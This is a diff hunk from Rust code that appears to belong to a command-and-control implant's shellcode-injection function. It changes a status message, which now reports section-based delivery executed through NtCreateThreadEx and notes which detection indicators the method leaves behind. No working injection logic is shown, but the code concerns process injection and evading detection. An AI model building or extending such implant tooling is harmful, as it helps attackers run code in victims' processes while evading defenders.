@@ -659,7 +659,7 @@ pub fn do_inject(method: u8, pid: u32, spawn_to: &str, shellcode: &[u8]) -> nyx_
                 if n == 0 { buf[0] = b'0'; i = 1; }
                 else { while n > 0 { i -= 1; buf[i] = b'0' + (n % 10) as u8; n /= 10; } }
                 for &b in &buf[i..] { msg.push(b as char); }
-                msg.push_str(") — 0-of-3 FND (no VirtualAllocEx / WriteProcessMemory / CreateRemoteThread)");
+                msg.push_str(") — section delivery ok, executed via NtCreateThreadEx (remote-thread IOC present — NOT threadless)");
                 return nyx_protocol::Response::Output(msg.into_bytes());
             }
             Err(e) => {
